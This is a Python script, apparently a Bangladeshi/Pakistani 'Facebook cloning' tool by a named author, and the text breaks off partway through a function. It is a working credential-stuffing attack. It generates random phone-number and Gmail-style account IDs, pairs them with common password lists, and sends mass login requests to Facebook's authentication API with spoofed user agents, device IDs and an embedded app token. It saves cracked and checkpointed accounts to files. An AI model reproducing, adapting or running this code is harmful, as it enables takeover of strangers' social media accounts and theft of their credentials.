#fb__It'z Jisan Xhowdhury 
#github__X1X4D-2-0 

exec("""\nfbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')\n\ntry:\n	import os,requests,json,time,re,random,sys,uuid,string,subprocess\n	from string import *\n	import bs4\n	#import dz\n	from concurrent.futures import ThreadPoolExecutor as tred\n	from bs4 import BeautifulSoup as sop\n	from bs4 import BeautifulSoup\nexcept ModuleNotFoundError: \n	print('\\n Installing missing modules ...')\n	os.system('pip install requests bs4 futures==2 > /dev/null')\n	os.system('python HAMIM.py')\n	\nprint('[•] FOLLWO MY PAGE ')\nos.system('xdg-open https://www.facebook.com/Atticking420')\n\ntry:\n	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text\n	open('proxies.txt','w').write(proxies)\nexcept Exception as e:\n	print('\\x1b[1;95m[√] LOADING...')\n	\nproxies=open('proxies.txt','r').read().splitlines()\n\n\nandroid_models=[]\ntry:\n	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()\n	for line in xx:\n		android_models.append(line)\nexcept:pass\n\nusr=[]\ntry:\n	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()\n	for us in xd:\n		usr.append(us)\nexcept: pass\n\ngt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])\nugen=[]\nfor xd in range(10000):\n	aa='Mozilla/5.0 (Linux; U; Android'\n	b=random.choice(['6','7','8','9','10','11','12','13'])\n	c=f' en-us; {str(gt)}'\n	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'\n	h=random.randrange(73,100)\n	i='0'\n	j=random.randrange(4200,4900)\n	k=random.randrange(40,150)\n	l='Mobile Safari/537.36'\n	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'\n	ugen.append(uaku2)\nfor agent in range(10000):\n	aa='Mozilla/5.0 (Linux; Android 6.0.1;'\n	b=random.choice(['6','7','8','9','10','11','12','13'])\n	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'\n	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n	e=random.randrange(1, 999)\n	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'\n	h=random.randrange(73,100)\n	i='0'\n	j=random.randrange(4200,4900)\n	k=random.randrange(40,150)\n	l='Mobile Safari/533.1'\n	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')\n	ugen.append(fullagnt)\nrug=[]\nfor nt in range(10000):\n	rr=random.randint\n	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n	rx=random.randrange(1, 999)\n	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"\n	rug.append(xx)\nruz=[]\nfor mtc in range(10000):\n	rr=random.randint\n	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"\n	ruz.append(xd)\n	\n#new ua\nugen=[]\nfor agent in range(10000):\n        aa='Mozilla/5.0 (Linux; Android 6.0.1;'\n        b=random.choice(['6','7','8','9','10','11','12'])\n        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'\n        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n        e=random.randrange(1, 999)\n        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'\n        h=random.randrange(73,100)\n        i='0'\n        j=random.randrange(4200,4900)\n        k=random.randrange(40,150)\n        l='Mobile Safari/533.1'\n        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')\n        ugen.append(fullagnt)\n\nsim_id = ''\nandroid_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\\n','')\nmodel = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\\n','')\nbuild = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\\n','')\nfblc = 'en_GB'\ntry:\n        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\\n','')\nexcept:\n        fbcr = 'Zong'\nfbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\\n','')\nfbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\\n','')\nfbdv = model\nfbsv = android_version\nfbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\\n','')\nfbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\\n','')\ntry:\n        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')\n        total = 0\n        for i in fbcr:\n                total+=1\n        select = ('1','2')\n        if select == '1':\n                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\\n','')\n                sim_id+=fbcr\n        elif select == '2':\n                try:\n                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\\n','')\n                        sim_id+=fbcr\n                except Exception as e:\n                        fbcr = "Zong"\n                        sim_id+=fbcr\n        else:\n                fbcr = 'Zong'\n                sim_id+=fbcr\nexcept:\n        fbcr = "Zong"\ndevice = {\n        'android_version':android_version,\n        'model':model,\n        'build':build,\n        'fblc':fblc,\n        'fbmf':fbmf,\n        'fbbd':fbbd,\n        'fbdv':model,\n        'fbsv':fbsv,\n        'fbca':fbca,\n        'fbdm':fbdm}\n\nlogo=(\"\"\"\n\\033[0;95m██╗  ██╗ █████╗ ███╗   ███╗██╗███╗   ███╗\n\\033[0;95m██║  ██║██╔══██╗████╗ ████║██║████╗ ████║\n\\033[0;95m███████║███████║██╔████╔██║██║██╔████╔██║\n\\033[0;95m██╔══██║██╔══██║██║╚██╔╝██║██║██║╚██╔╝██║\n\\033[0;95m██║  ██║██║  ██║██║ ╚═╝ ██║██║██║ ╚═╝ ██║\n\\033[0;95m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝     ╚═╝\n\\033[1;37m--------------------------------------------------\n[~] Author   : HAMIM UDDIN JISAN \n[~] Facebook : It'z Jisan Xhowdhury \n[~] Tool     : FREE\n[~] Version  : 1.2\n\\033[1;37m----------------------------------------------\"\"\")\ndef linex():\n	print('\\033[1;37m----------------------------------------------')\ndef clear():\n	os.system('clear')\n	print(logo)\nA = '\\x1b[1;97m' \nB = '\\x1b[1;96m' \nC = '\\x1b[1;91m' \nD = '\\x1b[1;92m'\nM = '\\033[1;31m'\nH = '\\033[1;32m'\nN = '\\x1b[1;37m'	\nE = '\\x1b[1;93m' \nF = '\\x1b[1;94m'\nG = '\\x1b[1;95m'\nP = '\\033[1;37m'\ndef cek_apk(session,coki):\n	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text\n	sop = BeautifulSoup(w,"html.parser")\n	x = sop.find("form",method="post")\n	game = [i.text for i in x.find_all("h3")]\n	if len(game)==0:\n		print(f'\\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))\n	else:\n		print(f'\\r{A} [•]%s Active Apks & Web 👇 '%(H))\n		for i in range(len(game)):\n			print(f"\\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))\n	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text\n	sop = BeautifulSoup(w,"html.parser")\n	x = sop.find("form",method="post")\n	game = [i.text for i in x.find_all("h3")]\n	if len(game)==0:\n		print(f'\\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))\n	else:\n		print(f'\\r{A} [•]%s Expired Apks & Web 👇 '%(M))\n		for i in range(len(game)):\n			print(f"\\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))\nloop=0\noks=[]\ncps=[]\npcp=[]\nid=[]\ntokenku=[]\n\ndef menu():\n			clear()\n		#	linex()\n			print(' [1] File cloning\\n [2] Random cloning\\n [3] gmail cloning \\n [4] join whatsap group \\n [0] Exit menu')\n			linex()\n			xd=input(' Choose an option: ')\n		#	os.system('xdg-open https://www.facebook.com/dr.paigham')\n			if xd in ['1','01']:\n				clear()\n				print(' Put file example:  /sdcard/jisan.txt  etc..')\n				linex()\n				file = input(' Put file path\\033[1;37m: ')\n				try:\n					fo = open(file,'r').read().splitlines()\n				except FileNotFoundError:\n					print(' File location not found ')\n					time.sleep(1)\n					menu()\n				clear()\n				print(' All method working ')\n				linex()\n				print(' \\033[1;33m[1] \\033[1;37mMethod  (for mix ids)  \\033[1;32m (fast) \\n\\033[1;33m [2] \\033[1;37mMethod  (for mix ids) \\033[1;32m  (best)  \\n\\033[1;33m [3]\\033[1;37m Method  (with cokies)\\033[1;32m   (v.fast) \\n\\033[1;33m [4]\\033[1;37m Method  (for new ids)\\033[1;32m   (best) \\n \\033[1;33m[5] \\033[1;37mMethod  (for new ids) \\033[1;32m  (slow) \\n \\033[1;33m[6] \\033[1;37mMethod  (for new ids) \\n \\033[1;33m[7] \\033[1;37mMethod  (for new ids) \\n \\033[1;33m[8] \\033[1;37mMethod  (for new ids) ')\n				linex()\n				mthd=input(' Choose: ')\n				linex()\n				plist = []\n				try:\n					ps_limit = int(input(' How many passwords do you want to add ? '))\n				except:\n					ps_limit =1\n				clear()\n				print('\\033[1;32m exp: first last,firtslast,first123')\n				linex()\n				for i in range(ps_limit):\n					plist.append(input(f' Put password {i+1}: '))\n				clear()\n				print(' Do you went show cp account? (y/n): ')\n				linex()\n				cx=input(' Choose: ')\n				if cx in ['y','Y','yes','Yes','1']:\n					pcp.append('y')\n				else:\n					pcp.append('n')\n				with tred(max_workers=30) as crack_submit:\n					clear()\n					total_ids = str(len(fo))\n					print(' Total account ids : \\033[1;32m'+total_ids+f' ')\n					print(' \\033[1;37mThe process is running in the background')\n					linex()\n					for user in fo:\n						ids,names = user.split('|')\n						passlist = plist\n						if mthd in ['1','01']:\n							crack_submit.submit(api1,ids,names,passlist)\n						elif mthd in ['2','02']:\n							crack_submit.submit(api2,ids,names,passlist)\n						elif mthd in ['3','03']:\n							crack_submit.submit(api3,ids,names,passlist)\n						elif mthd in ['4','04']:\n							crack_submit.submit(api4,ids,names,passlist)\n						elif mthd in ['5','05']:\n							crack_submit.submit(api5,ids,names,passlist)\n						elif mthd in ['6','06']:\n							crack_submit.submit(api6,ids,names,passlist)\n						elif mthd in ['7','07']:\n							crack_submit.submit(api7,ids,names,passlist)\n						elif mthd in ['8','08']:\n							crack_submit.submit(api8,ids,names,passlist)\n				print('\\033[1;37m')\n				linex()\n				print(' The process has completed')\n				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))\n				linex()\n				input(' Press enter to back ')\n				os.system('python HAMIM.py')\n			elif xd in ['2','02']:\n				pak()\n			elif xd in ['3','03']:\n				gmail()\n				#create()\n				#dz._login()\n				exit()\n			elif xd in ['4','04']:\n				os.system('xdg-open https://www.facebook.com/TurRealabbu1')\n				menu()\n			elif xd in ['0','00']:\n				exit(' Thanks for use 🥰 ')\n			else:\n				exit(' Option not found in menu...')\n		\ndef pak():\n		user=[]\n		clear()\n		print('\\033[1;35m Code example: 0306,0315,0335,0345')\n		code = input('\\033[1;37m put code: ')\n		try:\n			limit = int(input('\\033[1;35m example: 2000, 3000, 5000, 10000\\n\\033[1;37m put limit: '))\n		except ValueError:\n			limit = 5000\n		clear()\n		print('\\033[1;32m [1] \\033[1;33mMethod   (best) \\033[1;32m \\n [2] \\033[1;33mMethod   (v-fast)  \\033[1;32m \\n [3] \\033[1;33mMethod   (v-best)  \\033[1;32m \\n [4] \\033[1;33mMethod   (with cokies) \\033[1;32m \\n [5] \\033[1;33mMethod   (slow)  \\033[1;32m \\n [6] \\033[1;33mMethod   (slow) ')\n		linex()\n		mthd = input(' Choose: ')\n		clear()\n		print('\\033[1;32m [1] \\033[1;33mClone with 7+11 digit pass (v-fast) \\n\\033[1;32m [2]\\033[1;33m Clone with auto pass (best) \\n\\033[1;32m [3]\\033[1;33m Clone with auto pass (fast)\\n\\033[1;32m [5] \\033[1;33mClone with auto pass (slow-best) \\n\\033[1;32m [5] \\033[1;33mClone with auto pass (slow-fast) \\n\\033[1;32m [6] \\033[1;33mClone with auto pass (slow-best) \\n\\033[1;32m [7] \\033[1;33mClone with auto pass (only-BD) \\n\\033[1;32m [8] \\033[1;33mClone with auto pass (only-AFG) ')\n		linex()\n		pcs = input(' [?] Select: ')\n		for nmbr in range(limit):\n			nmp = ''.join(random.choice(string.digits) for _ in range(7))\n			user.append(nmp)\n		with tred(max_workers=30) as HAMIM:	\n			clear()\n			tl = str(len(user))\n			print(' Total ids : \\033[1;32m'+tl+f' ')\n			print(f'\\033[1;37m Choice code  :\\033[1;32m '+code)\n			print(' \\033[1;37mThe process is running in the background')\n			linex()\n			for psx in user:\n				ids = code+psx\n				if pcs in ['1','01']:\n					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']\n				if pcs in ['2','02']:\n					passlist = [psx,ids,'khankhan','khan1122','ali12345','pakistan','khan12345','ali1122','baloch12345','khan','baloch','khan','pubg','pubg1122','malik786']\n				elif pcs in ['3','03']:\n					passlist = [psx,ids,'pubg','pubg1122','pubgking','pubg12','pubg123','pubg1234']\n				elif pcs in ['4','04']:\n					passlist = [psx,ids,'khankhan','khan1122','khan1234','khan123']\n				elif pcs in ['5','05']:\n					passlist = [psx,ids]\n				elif pcs in ['6','06']:\n					passlist = [psx,ids,'khankhan','khan1122','786786','ali786','khan123','khan12','pakistan','ali123','khanbaba']\n				elif pcs in ['7','07']:\n					passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']\n				elif pcs in ['8','08']:\n					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']\n				if mthd in ['1','01']:\n					HAMIM.submit(HAMIM1,ids,passlist)\n				if mthd in ['2','02']:\n					HAMIM.submit(HAMIM2,ids,passlist)\n				if mthd in ['3','03']:\n					HAMIM.submit(HAMIM3,ids,passlist)\n				if mthd in ['4','04']:\n					HAMIM.submit(HAMIM4,ids,passlist)\n				if mthd in ['5','05']:\n					HAMIM.submit(HAMIM5,ids,passlist)\n				if mthd in ['6','06']:\n					HAMIM.submit(HAMIM6,ids,passlist)\n		print('\\033[1;37m')\n		linex()\n		print(' The process has completed')\n		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))\n		linex()\n		input(' Press enter to back ')\n		os.system('python HAMIM.py')\n\ndef gmail():\n		os.system('rm -rf .re.txt')\n		clear()\n		print('\\033[1;37m example: ramzan, ali, sajjad, faizan\\033[1;97m')\n		linex()\n		first = input(' Put first name: ')\n		linex()\n		print('\\033[1;37m example: khan, ahmad, ali \\033[1;97m')\n		linex()\n		last = input(' Put last name: ')\n		linex()\n		print(' Example: @gmail.com ')\n		linex()\n		domain = input(' domain: ')\n		linex()\n		try:\n			limit=int(input(' Put limit: '))\n		except ValueError:\n			limit = 5000\n		clear()\n		print(' [1] Only name password \\n [2] name + digit password \\n [3] Capital name password\\n [4] Auto all password')\n		linex()\n		pxc = input(' Choose : ')\n		clear()\n		print('\\033[1;32m [1] \\033[1;33mMethod   (best) \\033[1;32m \\n [2] \\033[1;33mMethod   (v-fast)  \\033[1;32m \\n [3] \\033[1;33mMethod   (v-best)  \\033[1;32m \\n [4] \\033[1;33mMethod   (slow) \\033[1;32m \\n [5] \\033[1;33mMethod   (slow)  \\033[1;32m \\n [6] \\033[1;33mMethod   (slow) ')\n		linex()\n		mthd = input(' Choose: ')\n		linex()\n		print(' Getting gmails...')\n		lists = ['3','4']\n		for xd in range(limit):\n			lchoice = random.choice(lists)\n			if '3' in lchoice:\n				mail = ''.join(random.choice(string.digits) for _ in range(3))\n				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\\n')\n			else:\n				mail = ''.join(random.choice(string.digits) for _ in range(4))\n				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\\n')\n			fo = open('.re.txt', 'r').read().splitlines()\n		with tred(max_workers=30) as HAMIM:\n			total = str(len(fo))\n			clear()\n			print(' Total ids : \\033[1;32m'+total+f' ')\n			print(' \\033[1;37mThe process is running in the background')\n			linex()\n			for user in fo:\n				ids,names = user.split('|')\n				first_name = names.rsplit(' ')[0]\n				try:\n					last_name = names.rsplit(' ')[1]\n				except IndexError:\n					last_name = 'Khan'\n				fs = first_name.lower()\n				ls = last_name.lower()\n				if pxc in ['1','01']:\n					passlist = [fs+ls,fs+' '+ls,fs]\n				elif pxc in ['2','02']:\n					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']\n				elif pxc in ['3','03']:\n					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']\n				else:\n					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']\n				if mthd in ['1','01']:\n					HAMIM.submit(HAMIM1,ids,passlist)\n				if mthd in ['2','02']:\n					HAMIM.submit(HAMIM2,ids,passlist)\n				if mthd in ['3','03']:\n					HAMIM.submit(HAMIM3,ids,passlist)\n				if mthd in ['4','04']:\n					HAMIM.submit(HAMIM4,ids,passlist)\n				if mthd in ['5','05']:\n					HAMIM.submit(HAMIM5,ids,passlist)\n				if mthd in ['6','06']:\n					HAMIM.submit(HAMIM6,ids,passlist)\n		print('\\033[1;37m')\n		linex()\n		print(' The process has completed')\n		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))\n		linex()\n		input(' Press enter to back ')\n		os.system('python HAMIM.py')\n#b-api method\n#1method\ndef api1(ids,names,passlist):\n		try:\n			global ok,loop\n			sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M1] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n			fn = names.split(' ')[0]\n			try:\n				ln = names.split(' ')[1]\n			except:\n				ln = fn\n			for pw in passlist:\n				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())\n				\n				application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))\n				application_version_code=str(random.randint(000000000,999999999))\n				__iam_genius = random.choice(android_models)\n				phone_model = __iam_genius.split('|')[0]\n				phone_company = __iam_genius.split('|')[1]\n				dimensions = __iam_genius.split('|')[2]\n				ffb=random.choice(fbks)\n				dvlk = random.choice(usr)\n				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'\n				li = ['28','29','210']\n				li2 = random.choice(li)\n				j1 = ''.join(random.choice(digits) for _ in range(2))\n				j2 = li2+j1\n				device_family_id = str(uuid.uuid4())\n				adid = str(uuid.uuid4())\n				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))\n				data = {'adid':adid,\n				'format':'json',\n				'device_id':device_family_id,\n				'email':ids,\n				'password':pas,\n				'generate_analytics_claim':'1',\n				'community_id':'','cpl':'true','try_num':'1',\n				'family_device_id':device_family_id,\n				'credentials_type':'device_based_login_password',\n				'generate_session_cookies':'1',\n				'error_detail_type':'button_with_disabled',\n				'source':'device_based_login',\n				'machine_id':machine_id,\n				'login_location_accuracy_m':'1.0',\n				'meta_inf_fbmeta':'',\n				'advertiser_id':adid,\n				'encrypted_msisdn':'',\n				'currently_logged_in_userid':'0',\n				'locale':'en_PK',\n				'client_country_code':'PK',\n				'method':'auth.login',\n				'fb_api_req_friendly_name':'authenticate',\n				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',\n				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}\n				head = {\n				'content-type':'application/x-www-form-urlencoded',\n				'x-fb-sim-hni':str(random.randint(2e4,4e4)),\n				'x-fb-connection-type':'unknown',\n				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',\n				'user-agent':ua_string,\n				'x-fb-net-hni':str(random.randint(2e4,4e4)),\n				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),\n				'x-fb-connection-quality':'EXCELLENT',\n				'x-fb-friendly-name':'authenticate',\n				'accept-encoding':'gzip, deflate',\n				'x-fb-http-engine':	'Liger'}\n				url = 'https://b-api.facebook.com/method/auth.login'\n				po = requests.post(url,data=data,headers=head,allow_redirects=False).text\n				q = json.loads(po)\n				if 'session_key' in q:\n					print('\\r\\r\\033[1;32m [HAMIM-OK] '+ids+' | '+pas+'\\033[1;97m')\n					open('/sdcard/HAMIM-OK.txt','a').write(ids+'|'+pas+'\\n')\n					oks.append(ids)\n					break\n				elif 'www.facebook.com' in q['error_msg']:\n					if 'y' in pcp:\n						print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+ids+' | '+pas+'\\033[1;97m')\n						open('/sdcard/HAMIM-CP.txt','a').write(ids+'|'+pas+'\\n')\n						cps.append(ids)\n						break\n					else:\n						open('/sdcard/HAMIM-CP.txt','a').write(ids+'|'+pas+'\\n')\n						break\n				else:\n					continue\n			loop+=1\n		except requests.exceptions.ConnectionError:\n			time.sleep(10)\n		except Exception as e:\n			pass\n#m2\n#b-graph method		\ndef api2(ids,names,passlist):\n        try:\n                global ok,loop,sim_id\n                sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M2] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n                fn = names.split(' ')[0]\n                try:\n                        ln = names.split(' ')[1]\n                except:\n                        ln = fn\n                for pw in passlist:\n                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        fbav = 